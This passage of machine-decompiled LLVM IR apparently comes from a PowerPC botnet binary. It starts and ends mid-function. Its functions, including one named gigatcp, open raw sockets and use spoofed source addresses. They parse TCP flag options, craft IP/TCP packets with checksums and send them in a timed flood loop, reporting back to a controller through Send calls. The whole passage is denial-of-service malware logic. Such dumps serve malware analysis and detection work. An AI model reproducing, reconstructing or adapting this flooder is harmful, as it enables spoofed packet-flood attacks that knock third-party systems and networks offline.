  %v0_1000844c = call i32 @random()
  %v1_10008470 = urem i32 %v0_10008420, 65536
  store i32 %v1_10008470, i32* %stack_var_-236, align 4
  store i32 268469384, i32* @lr, align 4
  %v0_10008484 = call i32 @random()
  %v3_100084b0 = call i32 @in_cksum(i16* %v2_100084b0, i32 20)
  store i32 268469440, i32* @lr, align 4
  %v0_100084bc = call i32 @random()
  store i32 %v0_10008420, i32* %stack_var_-196, align 4
  store i32 40, i32* @r3, align 4
  %v1_10008548 = call i32 @htons(i32 40)
  store i32 20, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008574.343 to i32), i32* @lr, align 4
  %v4_10008570 = call i32 @bcopy(i32 %v2_10008558, i32 %v2_10008560, i32 20, i32 %v2_1000855c)
  store i32 20, i32* @r5, align 4
  store i32 268469652, i32* @lr, align 4
  %v4_10008590 = call i32 @bcopy(i32 %v2_10008578, i32 %v2_10008580, i32 20, i32 %v2_1000855c)
  %v3_100085a8 = call i32 @in_cksum(i16* %v2_100085a8, i32 52)
  store i32 268469728, i32* @lr, align 4
  %v6_100085dc = call i32 @sendto(i32 %v3_100081e8, i32 %v2_100084a4, i32 60, i32 0, i32 %v2_100085bc, i32 16)
  %tmp73 = icmp ult i32 %stack_var_-260.0, 100
  br i1 %tmp73, label %dec_label_pc_10008620, label %dec_label_pc_100085ec

dec_label_pc_100085ec:                            ; preds = %dec_label_pc_10008420
  store i32 268469748, i32* @lr, align 4
  %v1_100085f0 = call i32 @__GI_time(i32 0)
  %v2_10008608 = icmp ult i32 %v1_100085f0, %v2_10008604
  br i1 %v2_10008608, label %dec_label_pc_10008618, label %dec_label_pc_10008610

dec_label_pc_10008610:                            ; preds = %dec_label_pc_100085ec
  %v0_10008614 = call i32 @__GI_exit()
  br label %dec_label_pc_10008618

dec_label_pc_10008618:                            ; preds = %dec_label_pc_100085ec, %dec_label_pc_10008610
  br label %dec_label_pc_10008620

dec_label_pc_10008620:                            ; preds = %dec_label_pc_10008420, %dec_label_pc_10008618
  %stack_var_-260.1 = phi i32 [ %stack_var_-260.0, %dec_label_pc_10008420 ], [ 0, %dec_label_pc_10008618 ]
  %v1_10008624 = add i32 %stack_var_-260.1, 1
  br label %dec_label_pc_100083f4

dec_label_pc_10008630:                            ; preds = %entry
  ret i32 %v1_100081cc

; uselistorder directives
  uselistorder i32 %v0_10008420, { 1, 0 }
  uselistorder i32 %v2_1000855c, { 1, 0 }
  uselistorder i32 %v1_100083c0, { 1, 0 }
  uselistorder i32 %v1_10008270, { 1, 2, 0 }
  uselistorder i32 %v3_10008240, { 1, 0 }
  uselistorder i32* %stack_var_-296, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-256, { 0, 2, 1 }
  uselistorder i32* %stack_var_-196, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10008620, { 1, 0 }
  uselistorder label %dec_label_pc_10008618, { 1, 0 }
  uselistorder label %dec_label_pc_10008420, { 1, 0 }
  uselistorder label %dec_label_pc_10008240, { 1, 0 }
  uselistorder label %dec_label_pc_10008278.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10008208, { 1, 0 }
}

define i32 @gigatcp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-360 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-232 = alloca i32, align 4
  %v2_10008678 = ptrtoint i32* %stack_var_-232 to i32
  store i32 %v2_10008678, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002b144.345 to i32), i32* @r4, align 4
  store i32 80, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10008690.346 to i32), i32* @lr, align 4
  %v0_1000868c = call i32 @memcpy()
  %v2_100086a8 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_100086a8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002b0c8.347 to i32), i32* @r4, align 4
  store i32 124, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_100086c0.348 to i32), i32* @lr, align 4
  %v0_100086bc = call i32 @memcpy()
  store i32 268469968, i32* @lr, align 4
  %v1_100086cc = call i32 @__GI_time(i32 0)
  %v1_100086dc = call i32 @mfork(i32 %arg2)
  %v3_100086e4 = icmp eq i32 %v1_100086dc, 0
  br i1 %v3_100086e4, label %dec_label_pc_100086ec, label %dec_label_pc_10008e2c

dec_label_pc_100086ec:                            ; preds = %entry
  store i32 268470012, i32* @lr, align 4
  %v3_100086f8 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp81 = icmp sgt i32 %v3_100086f8, -1
  br i1 %tmp81, label %dec_label_pc_10008718, label %dec_label_pc_10008710

dec_label_pc_10008710:                            ; preds = %dec_label_pc_100086ec
  %v0_10008714 = call i32 @__GI_exit()
  br label %dec_label_pc_10008718

dec_label_pc_10008718:                            ; preds = %dec_label_pc_100086ec, %dec_label_pc_10008710
  %v2_1000871c = icmp sgt i32 %arg3, 2
  br i1 %v2_1000871c, label %dec_label_pc_10008788.preheader, label %dec_label_pc_10008724

dec_label_pc_10008724:                            ; preds = %dec_label_pc_10008718
  %v6_10008738 = call i32 @Send(i32 %arg1, i32 ptrtoint ([45 x i8]* @global_var_1002b194.349 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_10008740 = call i32 @__GI_exit()
  br label %dec_label_pc_10008788.preheader

dec_label_pc_10008788.preheader:                  ; preds = %dec_label_pc_10008718, %dec_label_pc_10008724
  %v2_1000875c = ptrtoint i32* %stack_var_-408 to i32
  %v2_10008760 = add i32 %v2_1000875c, 176
  %v2_10008774 = add i32 %v2_1000875c, 88
  br label %dec_label_pc_10008750

dec_label_pc_10008750:                            ; preds = %dec_label_pc_10008788.preheader, %dec_label_pc_10008750
  %storemerge1522 = phi i32 [ 0, %dec_label_pc_10008788.preheader ], [ %v1_10008780, %dec_label_pc_10008750 ]
  %v1_10008758 = mul i32 %storemerge1522, 4
  %v1_10008764 = add i32 %v2_10008760, %v1_10008758
  %v1_10008768 = inttoptr i32 %v1_10008764 to i32*
  %v2_10008768 = load i32, i32* %v1_10008768, align 4
  %v1_10008778 = trunc i32 %v2_10008768 to i8
  %v3_10008778 = add i32 %v2_10008774, %storemerge1522
  %v4_10008778 = inttoptr i32 %v3_10008778 to i8*
  store i8 %v1_10008778, i8* %v4_10008778, align 1
  %v1_10008780 = add nuw nsw i32 %storemerge1522, 1
  %tmp82 = icmp slt i32 %v1_10008780, 20
  br i1 %tmp82, label %dec_label_pc_10008750, label %dec_label_pc_10008794

dec_label_pc_10008794:                            ; preds = %dec_label_pc_10008750
  %v1_10008798 = add i32 %arg4, 4
  %v1_1000879c = inttoptr i32 %v1_10008798 to i32*
  %v2_1000879c = load i32, i32* %v1_1000879c, align 4
  store i32 268470188, i32* @lr, align 4
  %v3_100087a8 = call i32 @host2ip(i32 %arg2, i32 %v2_1000879c, i32 %v1_10008798)
  %v1_100087b8 = add i32 %arg4, 12
  %v1_100087bc = inttoptr i32 %v1_100087b8 to i32*
  %v2_100087bc = load i32, i32* %v1_100087bc, align 4
  store i32 268470216, i32* @lr, align 4
  %v1_100087c4 = call i32 @atol(i32 %v2_100087bc)
  %v2_100087d8 = load i32, i32* %v1_1000879c, align 4
  %v1_100087e0 = add i32 %arg4, 8
  %v1_100087e4 = inttoptr i32 %v1_100087e0 to i32*
  %v7_10008804 = call i32 @Send(i32 %arg1, i32 ptrtoint ([65 x i8]* @global_var_1002b1c4.352 to i32), i32 %arg2, i32 %v2_100087d8)
  store i32 2, i32* %stack_var_-248, align 4
  %v1_10008818 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v1_10008828 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10008828, i32* %stack_var_-360, align 4
  %v1_10008860 = call i32 @__asm_rlwimi(i32 10, i32 28, i32 0, i32 3)
  %v1_10008870 = call i32 @__asm_rlwimi(i32 0, i32 24, i32 4, i32 7)
  %v1_1000887c = call i32 @__asm_rlwinm(i32 %v1_10008870, i32 0, i32 11, i32 9)
  %v1_10008888 = call i32 @__asm_rlwinm(i32 %v1_1000887c, i32 0, i32 12, i32 10)
  %v1_10008894 = call i32 @__asm_rlwinm(i32 %v1_10008888, i32 0, i32 13, i32 11)
  %v1_100088a0 = call i32 @__asm_rlwinm(i32 %v1_10008894, i32 0, i32 15, i32 13)
  %v1_100088ac = call i32 @__asm_rlwinm(i32 %v1_100088a0, i32 0, i32 16, i32 14)
  %v1_100088b8 = call i32 @__asm_rlwinm(i32 %v1_100088ac, i32 0, i32 14, i32 12)
  %v2_100088d0 = load i32, i32* %v1_100087e4, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002b208.354 to i32), i32* @r4, align 4
  %v3_100088e0 = inttoptr i32 %v2_100088d0 to i8*
  %v4_100088e0 = call i32 @__GI_strcoll(i8* %v3_100088e0, i32 ptrtoint ([4 x i8]* @global_var_1002b208.354 to i32))
  %v3_100088e8 = icmp eq i32 %v4_100088e0, 0
  br i1 %v3_100088e8, label %dec_label_pc_100088f0, label %dec_label_pc_1000893c

dec_label_pc_100088f0:                            ; preds = %dec_label_pc_10008794
  br label %dec_label_pc_10008c04.preheader

dec_label_pc_1000893c:                            ; preds = %dec_label_pc_10008794
  %v2_10008944 = load i32, i32* %v1_100087e4, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1002b20c.355 to i32), i32* @r4, align 4
  %v3_10008954 = inttoptr i32 %v2_10008944 to i8*
  %v4_10008954 = call i32 @__GI_strcoll(i8* %v3_10008954, i32 ptrtoint ([5 x i8]* @global_var_1002b20c.355 to i32))
  %v3_1000895c = icmp eq i32 %v4_10008954, 0
  br i1 %v3_1000895c, label %dec_label_pc_10008964, label %dec_label_pc_1000898c

dec_label_pc_10008964:                            ; preds = %dec_label_pc_1000893c
  br label %dec_label_pc_10008c04.preheader

dec_label_pc_1000898c:                            ; preds = %dec_label_pc_1000893c
  %v2_10008994 = load i32, i32* %v1_100087e4, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1002b214.356 to i32), i32* @r4, align 4
  %v3_100089a4 = inttoptr i32 %v2_10008994 to i8*
  %v4_100089a4 = call i32 @__GI_strcoll(i8* %v3_100089a4, i32 ptrtoint ([5 x i8]* @global_var_1002b214.356 to i32))
  %v3_100089ac = icmp eq i32 %v4_100089a4, 0
  br i1 %v3_100089ac, label %dec_label_pc_100089b4, label %dec_label_pc_100089d0

dec_label_pc_100089b4:                            ; preds = %dec_label_pc_1000898c
  br label %dec_label_pc_10008c04.preheader

dec_label_pc_100089d0:                            ; preds = %dec_label_pc_1000898c
  %v2_100089d8 = load i32, i32* %v1_100087e4, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1002b21c.357 to i32), i32* @r4, align 4
  %v3_100089e8 = inttoptr i32 %v2_100089d8 to i8*
  %v4_100089e8 = call i32 @__GI_strcoll(i8* %v3_100089e8, i32 ptrtoint ([7 x i8]* @global_var_1002b21c.357 to i32))
  %v3_100089f0 = icmp eq i32 %v4_100089e8, 0
  br i1 %v3_100089f0, label %dec_label_pc_100089f8, label %dec_label_pc_10008a14

dec_label_pc_100089f8:                            ; preds = %dec_label_pc_100089d0
  br label %dec_label_pc_10008c04.preheader

dec_label_pc_10008a14:                            ; preds = %dec_label_pc_100089d0
  %v2_10008a1c = load i32, i32* %v1_100087e4, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1002b224.358 to i32), i32* @r4, align 4
  %v3_10008a2c = inttoptr i32 %v2_10008a1c to i8*
  %v4_10008a2c = call i32 @__GI_strcoll(i8* %v3_10008a2c, i32 ptrtoint ([8 x i8]* @global_var_1002b224.358 to i32))
  %v3_10008a34 = icmp eq i32 %v4_10008a2c, 0
  br i1 %v3_10008a34, label %dec_label_pc_10008a3c, label %dec_label_pc_10008a64

dec_label_pc_10008a3c:                            ; preds = %dec_label_pc_10008a14
  br label %dec_label_pc_10008c04.preheader

dec_label_pc_10008a64:                            ; preds = %dec_label_pc_10008a14
  %v2_10008a6c = load i32, i32* %v1_100087e4, align 4
  store i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32* @r4, align 4
  store i32 268470912, i32* @lr, align 4
  %v4_10008a7c = call i32 @__GI_strtok(i32 %v2_10008a6c, i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 %v4_10008a7c, i32* %stack_var_-408, align 4
  %v3_10008bc420 = icmp eq i32 %v4_10008a7c, 0
  br i1 %v3_10008bc420, label %dec_label_pc_10008c04.preheader, label %dec_label_pc_10008a8c

dec_label_pc_10008a8c:                            ; preds = %dec_label_pc_10008a64, %dec_label_pc_10008ba8
  %v3_10008a8c = phi i32 [ %v4_10008bb4, %dec_label_pc_10008ba8 ], [ %v4_10008a7c, %dec_label_pc_10008a64 ]
  %stack_var_-328.121 = phi i32 [ %stack_var_-328.0, %dec_label_pc_10008ba8 ], [ %v1_100088b8, %dec_label_pc_10008a64 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1002b230.360 to i32), i32* @r4, align 4
  %v3_10008a9c = inttoptr i32 %v3_10008a8c to i8*
  %v4_10008a9c = call i32 @__GI_strcoll(i8* %v3_10008a9c, i32 ptrtoint ([4 x i8]* @global_var_1002b230.360 to i32))
  %v3_10008aa4 = icmp eq i32 %v4_10008a9c, 0
  br i1 %v3_10008aa4, label %dec_label_pc_10008aac, label %dec_label_pc_10008abc

dec_label_pc_10008aac:                            ; preds = %dec_label_pc_10008a8c
  %v1_10008ab0 = or i32 %stack_var_-328.121, 131072
  br label %dec_label_pc_10008ba8

dec_label_pc_10008abc:                            ; preds = %dec_label_pc_10008a8c
  %v3_10008abc = load i32, i32* %stack_var_-408, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002b234.361 to i32), i32* @r4, align 4
  %v3_10008acc = inttoptr i32 %v3_10008abc to i8*
  %v4_10008acc = call i32 @__GI_strcoll(i8* %v3_10008acc, i32 ptrtoint ([4 x i8]* @global_var_1002b234.361 to i32))
  %v3_10008ad4 = icmp eq i32 %v4_10008acc, 0
  br i1 %v3_10008ad4, label %dec_label_pc_10008adc, label %dec_label_pc_10008aec

dec_label_pc_10008adc:                            ; preds = %dec_label_pc_10008abc
  %v1_10008ae0 = or i32 %stack_var_-328.121, 262144
  br label %dec_label_pc_10008ba8

dec_label_pc_10008aec:                            ; preds = %dec_label_pc_10008abc
  %v3_10008aec = load i32, i32* %stack_var_-408, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002b238.362 to i32), i32* @r4, align 4
  %v3_10008afc = inttoptr i32 %v3_10008aec to i8*
  %v4_10008afc = call i32 @__GI_strcoll(i8* %v3_10008afc, i32 ptrtoint ([4 x i8]* @global_var_1002b238.362 to i32))
  %v3_10008b04 = icmp eq i32 %v4_10008afc, 0
  br i1 %v3_10008b04, label %dec_label_pc_10008b0c, label %dec_label_pc_10008b1c

dec_label_pc_10008b0c:                            ; preds = %dec_label_pc_10008aec
  %v1_10008b10 = or i32 %stack_var_-328.121, 65536
  br label %dec_label_pc_10008ba8

dec_label_pc_10008b1c:                            ; preds = %dec_label_pc_10008aec
  %v3_10008b1c = load i32, i32* %stack_var_-408, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002b23c.363 to i32), i32* @r4, align 4
  %v3_10008b2c = inttoptr i32 %v3_10008b1c to i8*
  %v4_10008b2c = call i32 @__GI_strcoll(i8* %v3_10008b2c, i32 ptrtoint ([4 x i8]* @global_var_1002b23c.363 to i32))
  %v3_10008b34 = icmp eq i32 %v4_10008b2c, 0
  br i1 %v3_10008b34, label %dec_label_pc_10008b3c, label %dec_label_pc_10008b4c

dec_label_pc_10008b3c:                            ; preds = %dec_label_pc_10008b1c
  %v1_10008b40 = or i32 %stack_var_-328.121, 1048576
  br label %dec_label_pc_10008ba8

dec_label_pc_10008b4c:                            ; preds = %dec_label_pc_10008b1c
  %v3_10008b4c = load i32, i32* %stack_var_-408, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002b240.364 to i32), i32* @r4, align 4
  %v3_10008b5c = inttoptr i32 %v3_10008b4c to i8*
  %v4_10008b5c = call i32 @__GI_strcoll(i8* %v3_10008b5c, i32 ptrtoint ([4 x i8]* @global_var_1002b240.364 to i32))
  %v3_10008b64 = icmp eq i32 %v4_10008b5c, 0
  br i1 %v3_10008b64, label %dec_label_pc_10008b6c, label %dec_label_pc_10008b7c

dec_label_pc_10008b6c:                            ; preds = %dec_label_pc_10008b4c
  %v1_10008b70 = or i32 %stack_var_-328.121, 524288
  br label %dec_label_pc_10008ba8

dec_label_pc_10008b7c:                            ; preds = %dec_label_pc_10008b4c
  %v3_10008b7c = load i32, i32* %stack_var_-408, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1002b244.365 to i32), i32* @r4, align 4
  %v3_10008b8c = inttoptr i32 %v3_10008b7c to i8*
  %v4_10008b8c = call i32 @__GI_strcoll(i8* %v3_10008b8c, i32 ptrtoint ([4 x i8]* @global_var_1002b244.365 to i32))
  %v3_10008b94 = icmp eq i32 %v4_10008b8c, 0
  br i1 %v3_10008b94, label %dec_label_pc_10008b9c, label %dec_label_pc_10008ba8

dec_label_pc_10008b9c:                            ; preds = %dec_label_pc_10008b7c
  %v1_10008ba0 = or i32 %stack_var_-328.121, 2097152
  br label %dec_label_pc_10008ba8

dec_label_pc_10008ba8:                            ; preds = %dec_label_pc_10008b7c, %dec_label_pc_10008b6c, %dec_label_pc_10008b3c, %dec_label_pc_10008b0c, %dec_label_pc_10008adc, %dec_label_pc_10008aac, %dec_label_pc_10008b9c
  %stack_var_-328.0 = phi i32 [ %v1_10008ab0, %dec_label_pc_10008aac ], [ %v1_10008ae0, %dec_label_pc_10008adc ], [ %v1_10008b10, %dec_label_pc_10008b0c ], [ %v1_10008b40, %dec_label_pc_10008b3c ], [ %v1_10008b70, %dec_label_pc_10008b6c ], [ %v1_10008ba0, %dec_label_pc_10008b9c ], [ %stack_var_-328.121, %dec_label_pc_10008b7c ]
  store i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32* @r4, align 4
  store i32 268471224, i32* @lr, align 4
  %v4_10008bb4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 %v4_10008bb4, i32* %stack_var_-408, align 4
  %v3_10008bc4 = icmp eq i32 %v4_10008bb4, 0
  br i1 %v3_10008bc4, label %dec_label_pc_10008c04.preheader, label %dec_label_pc_10008a8c

dec_label_pc_10008c04.preheader:                  ; preds = %dec_label_pc_10008ba8, %dec_label_pc_10008a64, %dec_label_pc_10008a3c, %dec_label_pc_100089f8, %dec_label_pc_100089b4, %dec_label_pc_10008964, %dec_label_pc_100088f0
  %v2_10008cb0 = ptrtoint i32* %stack_var_-360 to i32
  %v2_10008cbc = bitcast i32* %stack_var_-360 to i16*
  %v2_10008d54 = ptrtoint i32* %stack_var_-340 to i32
  %v2_10008d58 = ptrtoint i32* %stack_var_-300 to i32
  %v2_10008d5c = ptrtoint i32* %stack_var_-288 to i32
  %v2_10008d74 = ptrtoint i32* %stack_var_-320 to i32
  %v2_10008d7c = ptrtoint i32* %stack_var_-268 to i32
  %v2_10008da4 = bitcast i32* %stack_var_-300 to i16*
  %v2_10008db8 = ptrtoint i32* %stack_var_-248 to i32
  %v2_10008e00 = add i32 %v1_100087c4, %v1_100086cc
  br label %dec_label_pc_10008c04

dec_label_pc_10008c04:                            ; preds = %dec_label_pc_10008c04.preheader, %dec_label_pc_10008e1c
  %storemerge = phi i32 [ %v1_10008e20, %dec_label_pc_10008e1c ], [ 0, %dec_label_pc_10008c04.preheader ]
  store i32 268471312, i32* @lr, align 4
  %v2_10008c0c = call i32 @realrand(i32 0, i32 31)
  %v0_10008c2c = call i32 @getspoof()
  store i32 60, i32* @r3, align 4
  %v1_10008c4c = call i32 @htons(i32 60)
  store i32 268471388, i32* @lr, align 4
  %v0_10008c58 = call i32 @random()
  %v1_10008c7c = urem i32 %v0_10008c2c, 65536
  store i32 %v1_10008c7c, i32* %stack_var_-340, align 4
  store i32 268471444, i32* @lr, align 4
  %v0_10008c90 = call i32 @random()
  %v3_10008cbc = call i32 @in_cksum(i16* %v2_10008cbc, i32 20)
  store i32 268471500, i32* @lr, align 4
  %v0_10008cc8 = call i32 @random()
  store i32 %v0_10008c2c, i32* %stack_var_-300, align 4
  store i32 40, i32* @r3, align 4
  %v1_10008d44 = call i32 @htons(i32 40)
  store i32 20, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008d70.366 to i32), i32* @lr, align 4
  %v4_10008d6c = call i32 @bcopy(i32 %v2_10008d54, i32 %v2_10008d5c, i32 20, i32 %v2_10008d58)
  store i32 20, i32* @r5, align 4
  store i32 268471696, i32* @lr, align 4
  %v4_10008d8c = call i32 @bcopy(i32 %v2_10008d74, i32 %v2_10008d7c, i32 20, i32 %v2_10008d58)
  %v3_10008da4 = call i32 @in_cksum(i16* %v2_10008da4, i32 52)
  store i32 268471772, i32* @lr, align 4
  %v6_10008dd8 = call i32 @sendto(i32 %v3_100086f8, i32 %v2_10008cb0, i32 60, i32 0, i32 %v2_10008db8, i32 16)
  %tmp83 = icmp ult i32 %storemerge, 100
  br i1 %tmp83, label %dec_label_pc_10008e1c, label %dec_label_pc_10008de8

dec_label_pc_10008de8:                            ; preds = %dec_label_pc_10008c04
  store i32 268471792, i32* @lr, align 4
  %v1_10008dec = call i32 @__GI_time(i32 0)
  %v2_10008e04 = icmp ult i32 %v1_10008dec, %v2_10008e00
  br i1 %v2_10008e04, label %dec_label_pc_10008e14, label %dec_label_pc_10008e0c

dec_label_pc_10008e0c:                            ; preds = %dec_label_pc_10008de8
  %v0_10008e10 = call i32 @__GI_exit()
  br label %dec_label_pc_10008e14

dec_label_pc_10008e14:                            ; preds = %dec_label_pc_10008de8, %dec_label_pc_10008e0c
  br label %dec_label_pc_10008e1c

dec_label_pc_10008e1c:                            ; preds = %dec_label_pc_10008c04, %dec_label_pc_10008e14
  %stack_var_-364.1 = phi i32 [ %storemerge, %dec_label_pc_10008c04 ], [ 0, %dec_label_pc_10008e14 ]
  %v1_10008e20 = add i32 %stack_var_-364.1, 1
  br label %dec_label_pc_10008c04

dec_label_pc_10008e2c:                            ; preds = %entry
  ret i32 %v1_100086dc

; uselistorder directives
  uselistorder i32 %v0_10008c2c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_10008d58, { 1, 0 }
  uselistorder i32 %v4_10008bb4, { 1, 2, 0 }
  uselistorder i32 %stack_var_-328.121, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %storemerge1522, { 2, 1, 0 }
  uselistorder i32* %stack_var_-408, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i32* %stack_var_-360, { 0, 2, 1 }
  uselistorder i32* %stack_var_-300, { 1, 0, 2 }
  uselistorder i32* %stack_var_-248, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10008e1c, { 1, 0 }
  uselistorder label %dec_label_pc_10008e14, { 1, 0 }
  uselistorder label %dec_label_pc_10008c04, { 1, 0 }
  uselistorder label %dec_label_pc_10008ba8, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_10008a8c, { 1, 0 }
  uselistorder label %dec_label_pc_10008750, { 1, 0 }
  uselistorder label %dec_label_pc_10008788.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10008718, { 1, 0 }
}

define i32 @makeRandomShit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268471916, i32* @lr, align 4
  %v1_10008e68 = call i32 @__GI_time(i32 0)
  store i32 %v1_10008e68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10008e78.368 to i32), i32* @lr, align 4
  %v1_10008e74 = call i32 @srand(i32 %v1_10008e68)
  store i32 %v1_10008e74, i32* %r3.global-to-local, align 4
  %v2_10008efc2 = icmp sgt i32 %arg2, 0
  br i1 %v2_10008efc2, label %dec_label_pc_10008e8c, label %dec_label_pc_10008f04

dec_label_pc_10008e8c:                            ; preds = %entry, %dec_label_pc_10008e8c
  %storemerge15 = phi i32 [ %v1_10008eec, %dec_label_pc_10008e8c ], [ 0, %entry ]
  store i32 268471968, i32* @lr, align 4
  %v0_10008e9c = call i32 @random()
  store i32 %v0_10008e9c, i32* %r3.global-to-local, align 4
  %v2_10008ebc = srem i32 %v0_10008e9c, 255
  %fold = add nsw i32 %v2_10008ebc, 1
  %v1_10008ee4 = trunc i32 %fold to i8
  %v2_10008ee4 = load i32, i32* @r29, align 4
  %v3_10008ee4 = inttoptr i32 %v2_10008ee4 to i8*
  store i8 %v1_10008ee4, i8* %v3_10008ee4, align 1
  %v1_10008eec = add nuw nsw i32 %storemerge15, 1
  %v2_10008efc = icmp slt i32 %v1_10008eec, %arg2
  br i1 %v2_10008efc, label %dec_label_pc_10008e8c, label %dec_label_pc_10008ef4.dec_label_pc_10008f04_crit_edge

dec_label_pc_10008ef4.dec_label_pc_10008f04_crit_edge: ; preds = %dec_label_pc_10008e8c
  %v0_10008f1c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008f04

dec_label_pc_10008f04:                            ; preds = %dec_label_pc_10008ef4.dec_label_pc_10008f04_crit_edge, %entry
  %v0_10008f1c = phi i32 [ %v0_10008f1c.pre, %dec_label_pc_10008ef4.dec_label_pc_10008f04_crit_edge ], [ %v1_10008e74, %entry ]
  ret i32 %v0_10008f1c

; uselistorder directives
  uselistorder i32 %v1_10008eec, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10008e8c, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  store i32 268472156, i32* @lr, align 4
  %v1_10008f58 = call i32 @__GI_time(i32 0)
  %v2_10008f68 = icmp sgt i32 %arg3, 3
  br i1 %v2_10008f68, label %dec_label_pc_10008f90, label %dec_label_pc_10008f70

dec_label_pc_10008f70:                            ; preds = %entry
  %v6_10008f84 = call i32 @Send(i32 %arg1, i32 ptrtoint ([85 x i8]* @global_var_1002b248.369 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_10008f8c = call i32 @__GI_exit()
  br label %dec_label_pc_10008f90

dec_label_pc_10008f90:                            ; preds = %entry, %dec_label_pc_10008f70
  %v1_10008f94 = call i32 @mfork(i32 %arg2)
  %v3_10008f9c = icmp eq i32 %v1_10008f94, 0
  br i1 %v3_10008f9c, label %dec_label_pc_10008fa4, label %dec_label_pc_1000926c

dec_label_pc_10008fa4:                            ; preds = %dec_label_pc_10008f90
  store i32 1024, i32* @r3, align 4
  store i32 268472236, i32* @lr, align 4
  %v0_10008fa8 = call i32 @malloc()
  store i32 %v0_10008fa8, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268472260, i32* @lr, align 4
  %v0_10008fc0 = call i32 @__GI_memset()
  %v1_10008fc8 = add i32 %arg4, 8
  %v1_10008fcc = inttoptr i32 %v1_10008fc8 to i32*
  %v2_10008fcc = load i32, i32* %v1_10008fcc, align 4
  store i32 ptrtoint (i32* @global_var_1002b2a0.371 to i32), i32* @r4, align 4
  %v2_10008fdc = inttoptr i32 %v2_10008fcc to i8*
  %v3_10008fdc = call i32 @__GI_strcoll(i8* %v2_10008fdc, i32 ptrtoint (i32* @global_var_1002b2a0.371 to i32))
  %v3_10008fe4 = icmp eq i32 %v3_10008fdc, 0
  br i1 %v3_10008fe4, label %dec_label_pc_10008fec, label %dec_label_pc_10008ff4

dec_label_pc_10008fec:                            ; preds = %dec_label_pc_10008fa4
  br label %dec_label_pc_10008ff4

dec_label_pc_10008ff4:                            ; preds = %dec_label_pc_10008fa4, %dec_label_pc_10008fec
  %stack_var_-64.0 = phi i32 [ 1, %dec_label_pc_10008fec ], [ 0, %dec_label_pc_10008fa4 ]
  %v1_10008ff8 = add i32 %arg4, 12
  %v1_10008ffc = inttoptr i32 %v1_10008ff8 to i32*
  %v2_10008ffc = load i32, i32* %v1_10008ffc, align 4
  store i32 ptrtoint (i32* @global_var_1002b2a0.371 to i32), i32* @r4, align 4
  %v2_1000900c = inttoptr i32 %v2_10008ffc to i8*
  %v3_1000900c = call i32 @__GI_strcoll(i8* %v2_1000900c, i32 ptrtoint (i32* @global_var_1002b2a0.371 to i32))
  %v3_10009014 = icmp eq i32 %v3_1000900c, 0
  br i1 %v3_10009014, label %dec_label_pc_1000901c, label %dec_label_pc_10009034

dec_label_pc_1000901c:                            ; preds = %dec_label_pc_10008ff4
